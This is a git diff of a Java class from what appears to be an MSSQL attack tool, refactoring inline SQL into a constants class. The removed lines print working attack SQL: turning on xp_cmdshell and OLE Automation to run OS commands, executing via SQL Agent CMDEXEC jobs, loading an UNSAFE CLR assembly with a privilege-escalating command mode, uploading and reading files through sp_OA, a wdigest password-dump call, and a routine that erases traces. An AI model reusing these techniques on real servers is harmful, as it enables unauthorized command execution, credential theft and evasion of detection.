@@ -3,6 +3,7 @@ package Dao;
 import Controller.MssqlController;
 import Entity.ControllersFactory;
 import Util.MessageUtil;
+import Util.MssqlSqlUtil;
 import Util.Utils;
 import Util.YamlConfigs;
 import javafx.application.Platform;
@@ -22,6 +23,7 @@ public class MssqlDao {
     private String DRIVER;
     private String USERNAME;
     private String PASSWORD;
+    private int TIMEOUT;
 
     private Connection CONN = null;
     private URLClassLoader URLCLASSLOADER = null;
@@ -45,6 +47,7 @@ public class MssqlDao {
         JDBCURL = MessageFormat.format(JDBCURL,ip,port,database,timeout);
         USERNAME = username;
         PASSWORD = password;
+        TIMEOUT = Integer.parseInt(timeout);
         // 动态加载
         URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
         METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
@@ -63,7 +66,7 @@ public class MssqlDao {
     public void testConnection() throws java.sql.SQLException {
         if (CONN == null || CONN.isClosed()) {
             // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
-            Utils.regroupDrivers("jtds");
+            Utils.regroupDrivers("sqlserverdriver");
             DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
             closeConnection();
         }
@@ -72,7 +75,7 @@ public class MssqlDao {
     public Connection getConnection() throws java.sql.SQLException {
         if (CONN == null || CONN.isClosed()) {
             // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
-            Utils.regroupDrivers("jtds");
+            Utils.regroupDrivers("sqlserverdriver");
             CONN = DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
         }
         return CONN;
@@ -100,6 +103,7 @@ public class MssqlDao {
             code = "GB2312";
         }
         stmt = CONN.createStatement();
+        //stmt.setQueryTimeout(TIMEOUT);
         boolean hasResultSet = stmt.execute(sqlStr);
         if (hasResultSet) {
             rs = stmt.getResultSet();
@@ -108,7 +112,8 @@ public class MssqlDao {
             while (rs.next()) {
                 for (int i = 0; i < columnCount; i++) {
                     try {
-                        String temp = new String(rs.getBytes(i+1),code)+ "\n";
+                        //String temp = new String(rs.getBytes(i + 1),code) + "\n";
+                        String temp = new String(rs.getString(i + 1).getBytes(),code) + "\n";
                         res.append(temp);
                     }catch (Exception e){
                         res.append("\n");
@@ -127,7 +132,8 @@ public class MssqlDao {
      */
     public void activateXPCS(){
         try {
-            excute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;","");
+
+            excute(MssqlSqlUtil.activationXPCMDSql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 激活成功！"));
         } catch (Exception e) {
             Platform.runLater(() ->{
@@ -141,7 +147,7 @@ public class MssqlDao {
      */
     public void activateOAP(){
         try {
-            excute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;","");
+            excute(MssqlSqlUtil.activationOAPSql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 激活成功！"));
         } catch (Exception e) {
             Platform.runLater(() ->{
@@ -162,7 +168,7 @@ public class MssqlDao {
         try {
             // 转义单引号
             command = command.replace("'","''");
-            String sqlStr = String.format("exec master..xp_cmdshell '%s'",command);
+            String sqlStr = String.format(MssqlSqlUtil.XPCMDSql,command);
             res = excute(sqlStr,code);
         } catch (Exception e) {
             Platform.runLater(() ->{
@@ -185,16 +191,15 @@ public class MssqlDao {
             // 转义单引号
             command = command.replace("'","''");
             // 改用数据文件目录，提高文件写入成功率，目录会存在换行符所以去掉
-            String path = excute("declare @path varchar(8000);select @path=rtrim(reverse(filename)) from master..sysfiles where name='master';select @path=reverse(substring(@path,charindex('\\',@path),8000));select @path",code).replace("\n","");
+            String path = excute(MssqlSqlUtil.getPathSql,code).replace("\n","");
             // 为目录添加双引号，有空格的目录需要双引号才能写入
             path = "\"" + path + filename +".txt\"";
-            excute(String.format("declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c %s > %s'",command,path),"");
+            excute(String.format(MssqlSqlUtil.runcmdOAPBULKSql,command,path),"");
             // 判断表是否存在，存在则删除该表
-            excute("if OBJECT_ID(N'oashellresult',N'U') is not null\n" +
-                    "\tDROP TABLE oashellresult;","");
+            excute(MssqlSqlUtil.deleteOashellResultSql,"");
             //读取的时候不需要双引号
-            excute(String.format("create table oashellresult(res varchar(8000));WAITFOR DELAY '0:0:%s';bulk insert oashellresult from '%s';",timeout,path.replace("\"","")),"");
-            oashellres = excute("SELECT * FROM oashellresult;",code);
+            excute(String.format(MssqlSqlUtil.getResFromTableSql,timeout,path.replace("\"","")),"");
+            oashellres = excute(MssqlSqlUtil.getOaShellResultSql,code);
         } catch (SQLException e) {
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
@@ -211,12 +216,7 @@ public class MssqlDao {
     public String runcmdOAPCOM(String command,String code) throws SQLException {
         // 转义单引号
         command = command.replace("'","''");
-        String sql = "declare @luan int,@exec int,@text int,@str varchar(8000);\n" +
-                "exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;\n" +
-                "exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c %s';\n" +
-                "exec sp_oamethod @exec, 'StdOut', @text out;\n" +
-                "exec sp_oamethod @text, 'readall', @str out\n" +
-                "select @str;";
+        String sql = MssqlSqlUtil.runcmdOAPCOMSql;
         String res = excute(String.format(sql,command),code);
         return res;
     }
@@ -231,13 +231,7 @@ public class MssqlDao {
         command = command.replace("'","''");
         String jobname = Utils.getRandomString();
         String res = "";
-        String sqlString = "IF OBJECT_ID(N'{jobname}') is not null\n" +
-                "\tEXEC sp_delete_job @job_name = N'{jobname}';\n" +
-                "USE msdb;\n" +
-                "EXEC dbo.sp_add_job @job_name = N'{jobname}';\n" +
-                "EXEC sp_add_jobstep @job_name = N'{jobname}', @step_name = N'{jobname}', @subsystem = N'CMDEXEC', @command = N'%s', @retry_attempts = 1, @retry_interval = 5;\n" +
-                "EXEC dbo.sp_add_jobserver @job_name = N'{jobname}';\n" +
-                "EXEC dbo.sp_start_job N'{jobname}';";
+        String sqlString = MssqlSqlUtil.runcmdAgentSql;
         sqlString = String.format(sqlString.replace("{jobname}",jobname),command);
         try {
             excute(sqlString,code);
@@ -256,14 +250,15 @@ public class MssqlDao {
     public String getVersion() {
         String res = null;
         try {
-            String sqlString = "select @@version";
+            String sqlString = MssqlSqlUtil.versionSql;
             res = excute(sqlString,"");
             res = res.replace("\n","");
-            mssqlController.mssqlLogTextArea.appendText(Utils.log("当前数据库版本:" + res));
+            mssqlController.mssqlLogTextArea.appendText(Utils.log("当前数据库版本:\n" + res));
         } catch (SQLException e) {
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
-            });        }
+            });
+        }
         return res;
     }
 
@@ -272,10 +267,10 @@ public class MssqlDao {
      * @return
      */
     public void getisdba() {
-        String sql = "select is_srvrolemember('sysadmin');";
+        String sql = MssqlSqlUtil.isAdminSql;
         String res = "";
         try {
-            res = excute(sql,"");
+            res = excute(sql,"").replace("\n","");
             if ("1".equals(res)) {
                 mssqlController.mssqlLogTextArea.appendText(Utils.log("该账号是 DBA 权限！"));
             } else {
@@ -284,69 +279,93 @@ public class MssqlDao {
         } catch (SQLException e) {
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
-            });        }
+            });
+        }
     }
 
     /**
      * 清理痕迹
      */
-    public void clearHistory(){
+    public boolean clearHistory(){
         try {
-            excute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;","");
+            excute(MssqlSqlUtil.closeXPCMDSql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 关闭成功！"));
-            excute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;","");
+            excute(MssqlSqlUtil.closeOapSql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 关闭成功！"));
-            excute("if OBJECT_ID(N'oashellresult',N'U') is not null\n" +
-                    "\tDROP TABLE oashellresult;","");
+            excute(MssqlSqlUtil.deleteOashellResultSql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("oashellresult 表删除成功！"));
-            excute("if (exists (select * from dbo.sysobjects where name = 'kitmain'))drop proc kitmain;\n" +
-                    "if (exists (select * from sys.assemblies where name='MDATKit'))drop assembly MDATKit;\n","");
+            excute(MssqlSqlUtil.closeCLRSql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("CLR 删除成功！"));
+            return true;
         } catch (SQLException e) {
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
-            });        }
+            });
+        }
+        return false;
 
+    }
+
+
+    /**
+     * 设数据库trustworthy为on.
+     * 针对程序集 'SqlServerTime' 的 ALTER ASSEMBLY 失败
+     * @return
+     */
+    public boolean setTrustworthy(String database,String status){
+        try {
+            String sql = MssqlSqlUtil.setTrustworthySql;
+            sql = String.format(sql,database,status);
+            excute(sql,"");
+            mssqlController.mssqlLogTextArea.appendText(Utils.log("设数据库 ["+ database +"] trustworthy 为 on 成功!"));
+            return true;
+        } catch(Exception e){
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+        return false;
     }
 
     /**
      * 激活 CLR
      */
-    public void activateCLR(){
+    public boolean activateCLR(){
         try {
-            String initsql = "exec sp_configure 'show advanced options','1';reconfigure;exec sp_configure 'clr enabled','1';reconfigure;exec sp_configure 'show advanced options','1';";
+            String initsql = MssqlSqlUtil.activationCLRSql;
             excute(initsql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("激活 CLR 成功！正在导入和创建函数请稍等..."));
+            return true;
         } catch(Exception e){
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
-            });        }
+            });
+        }
+        return false;
     }
 
 
     /**
      * 初始化 CLR 插件
      */
-    public void initCLR(){
+    public boolean initCLR(){
         try {
-            String checksql = "if (exists (select * from dbo.sysobjects where name = 'kitmain'))drop proc kitmain;\n" +
-                    "if (exists (select * from sys.assemblies where name='MDATKit'))drop assembly MDATKit;\n";
+            String checksql = MssqlSqlUtil.closeCLRSql;
             excute(checksql,"");
             // 获取插件目录
             String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mssql" + File.separator + "clr.txt";
             // 读取插件内容
             String contents = Utils.readFile(path).replace("\n","");
-            String importsql = String.format("CREATE ASSEMBLY [MDATKit]\n" +
-                    "AUTHORIZATION [dbo]\n" +
-                    "FROM 0x%s\n" +
-                    "WITH PERMISSION_SET = UNSAFE;\n",contents);
+            String importsql = String.format(MssqlSqlUtil.CreateAssemblySql,contents);
             excute(importsql,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("导入 CLR 程序成功！"));
+            return true;
         }catch (Exception e){
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
             });
         }
+        return false;
     }
 
 
@@ -355,7 +374,7 @@ public class MssqlDao {
      */
     public boolean checkCLR(){
         try {
-            String checksql1 = "if (exists (select * from dbo.sysobjects where name = 'kitmain')) select '1' as res;" ;
+            String checksql1 = MssqlSqlUtil.checkCLRSql;
             //String checksql2 = "if (exists (select * from sys.assemblies where name='MDATKit')) select '1' as res;" ;
             String c1 = excute(checksql1,"");
             //String c2 = excute(checksql2,"");
@@ -373,17 +392,18 @@ public class MssqlDao {
     /**
      * 创建 CLR 函数
      */
-    public void createCLRFunc(){
+    public boolean createCLRFunc(){
         try {
-            String createfunc = "CREATE PROCEDURE [dbo].[kitmain]\n" +
-                    "@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX) \n" +
-                    "AS EXTERNAL NAME [MDATKit].[StoredProcedures].[kitmain]";
+            String createfunc = MssqlSqlUtil.createCLRFSql;
             excute(createfunc,"");
             mssqlController.mssqlLogTextArea.appendText(Utils.log("创建 CLR 函数成功！"));
+            return true;
         }catch (Exception e){
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
-            });        }
+            });
+        }
+        return false;
     }
 
     /**
@@ -399,9 +419,9 @@ public class MssqlDao {
         try {
             //普通
             if("0".equals(type)){
-                res = excute(String.format("exec kitmain 'cmdexec',N'%s'",command),code);
+                res = excute(String.format(MssqlSqlUtil.cmdSql,command),code);
             }else {//尝试提权
-                res = excute(String.format("exec kitmain 'supercmdexec',N'%s'",command),code);
+                res = excute(String.format(MssqlSqlUtil.superCmdSql,command),code);
             }
         }catch (Exception e){
             MessageUtil.showExceptionMessage(e,e.getMessage());
@@ -409,16 +429,16 @@ public class MssqlDao {
         return res;
     }
 
-    /**
-     * 通过提权执行获取系统管理员密码
-     * @return
-     */
-    public String clrgetadminpassword() throws SQLException {
-        String res = null;
-        String sql = "exec kitmain 'wdigest',N''";
-        res = excute(sql,"");
-        return res;
-    }
+    ///**
+    // * 通过提权执行获取系统管理员密码
+    // * @return
+    // */
+    //public String clrgetadminpassword() throws SQLException {
+    //    String res = null;
+    //    String sql = MssqlSqlUtil.getSystemPasswordSql;
+    //    res = excute(sql,"");
+    //    return res;
+    //}
 
     /**
      * sp_OA 组件上传
@@ -427,14 +447,7 @@ public class MssqlDao {
      */
     public void normalUpload(String path,String contexts){
         path = path.replace("'","''");
-        String sql = "DECLARE @Obj INT;\n" +
-                "EXEC sp_OACreate 'ADODB.Stream' ,@Obj OUTPUT;\n" +
-                "EXEC sp_OASetProperty @Obj ,'Type',1;\n" +
-                "EXEC sp_OAMethod @Obj,'Open';\n" +
-                "EXEC sp_OAMethod @Obj,'Write', NULL, %s;\n" +
-                "EXEC sp_OAMethod @Obj,'SaveToFile', NULL, N'%s', 2;\n" +
-                "EXEC sp_OAMethod @Obj,'Close';\n" +
-                "EXEC sp_OADestroy @Obj;";
+        String sql = MssqlSqlUtil.normalUploadSql;
 
         try {
             sql = String.format(sql,"0x" + contexts,path);
@@ -445,7 +458,6 @@ public class MssqlDao {
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
             });
-            //PublicUtil.log(throwables.getMessage());
         }
     }
 
@@ -454,7 +466,7 @@ public class MssqlDao {
      * @return
      */
     public ArrayList<String> getDisk() {
-        String sqlString = "EXEC master.dbo.xp_fixeddrives";
+        String sqlString = MssqlSqlUtil.getDiskSql;
         ArrayList<String> res = new ArrayList<String>();
         try {
             stmt = CONN.createStatement();
@@ -480,11 +492,8 @@ public class MssqlDao {
      * @return
      */
     public ArrayList<String> getFiles(String path){
-        String filesql = String.format("if OBJECT_ID(N'DirectoryTree',N'U') is not null\n" +
-                "    DROP TABLE DirectoryTree;\n" +
-                "CREATE TABLE DirectoryTree (subdirectory varchar(8000),depth int,isfile bit);\n" +
-                "INSERT DirectoryTree (subdirectory,depth,isfile) EXEC master.dbo.xp_dirtree N'%s',1,1;",path);
-        String selectfile = "SELECT * FROM DirectoryTree";
+        String filesql = String.format(MssqlSqlUtil.getFilesSql,path);
+        String selectfile = MssqlSqlUtil.getFilesResSql;
         ArrayList<String> res = new ArrayList<>();
         try {
             excute(filesql,"");
@@ -513,18 +522,7 @@ public class MssqlDao {
     public String normalDownload(String path) throws SQLException {
         String res = "";
         path = path.replace("'","''");
-        String sql = "declare @o int, @f int, @t int, @ret int\n" +
-                "declare @line varchar(8000),@alllines varchar(8000)\n" +
-                "set @alllines =''\n" +
-                "exec sp_oacreate 'scripting.filesystemobject', @o out\n" +
-                "exec sp_oamethod @o, 'opentextfile', @f out, N'%s', 1\n" +
-                "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
-                "while (@ret = 0)\n" +
-                "begin\n" +
-                "set @alllines = @alllines + @line + '\n'\n" +
-                "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
-                "end\n" +
-                "select distinct convert(varbinary, @alllines) as lines";
+        String sql = MssqlSqlUtil.normalDownloadSql;
         sql = String.format(sql,path);
         try {
             stmt = CONN.createStatement();
@@ -552,10 +550,7 @@ public class MssqlDao {
      */
     public void normaldelete(String path) throws SQLException {
         path = path.replace("'","''");
-        String sql = "DECLARE @Filehandle int\n" +
-                "EXEC sp_OACreate 'Scripting.FileSystemObject', @Filehandle OUTPUT\n" +
-                "EXEC sp_OAMethod @Filehandle, 'DeleteFile', NULL, N'%s'\n" +
-                "EXEC sp_OADestroy @Filehandle";
+        String sql = MssqlSqlUtil.normaldeleteSql;
         sql = String.format(sql,path);
 
         excute(sql,"");
@@ -567,8 +562,8 @@ public class MssqlDao {
      * @param path
      */
     public void normalmkdir(String path) throws SQLException {
-        path = path.replace("'","''");
-        String sql = String.format("exec master.sys.xp_create_subdir N'%s'",path);
+        path = path.replace("'","''").replace("/","\\");
+        String sql = String.format(MssqlSqlUtil.normalmkdirSql,path);
         excute(sql,"");
     }
 
@@ -579,7 +574,7 @@ public class MssqlDao {
      */
     public void clrmkdir(String path) throws SQLException {
         path = path.replace("'","''");
-        String sql = String.format("exec kitmain 'newdir',N'%s'",path);
+        String sql = String.format(MssqlSqlUtil.clrmkdirSql,path);
         excute(sql,"");
 
     }
@@ -591,7 +586,7 @@ public class MssqlDao {
      */
     public void clrdelete(String path) throws SQLException {
         path = path.replace("'","''");
-        String sql = "exec kitmain 'delete',N'%s'";
+        String sql = MssqlSqlUtil.clrdeleteSql;
         sql = String.format(sql,path);
         excute(sql,"");
     }
@@ -604,12 +599,27 @@ public class MssqlDao {
      */
     public void clrupload(String path,String contexts) throws SQLException {
         path = path.replace("'","''");
-        String sql = "exec kitmain 'writefile',N'%s^%s'";
+        String sql = MssqlSqlUtil.clruploadSql;
         sql = String.format(sql,path,contexts);
         excute(sql,"");
     }
-//    public static void main(String[] args) {
-//        String aa = String.format("create table oashellresult(res varchar(8000));WAITFOR DELAY '0:0:%s';bulk insert oashellresult from '%%userprofile%%/%s.txt';","timeout","filename");
-//        System.out.println(aa);
-//    }
+
+    /**
+     * 一键恢复所有组件
+     */
+    public void recoveryAll() {
+        String sqls = MssqlSqlUtil.recoveryAllSql;
+        String[] sqlA = sqls.split("\n");
+        for (String sql:sqlA) {
+           try {
+               excute(sql,"");
+           }catch (Exception e){
+               mssqlController.mssqlLogTextArea.appendText(Utils.log("某组件恢复失败！当前语句："+sql+" - 错误："+ e.toString()));
+           }
+        }
+        mssqlController.mssqlLogTextArea.appendText(Utils.log("所有组件恢复成功！"));
+    }
+
+
+
 }
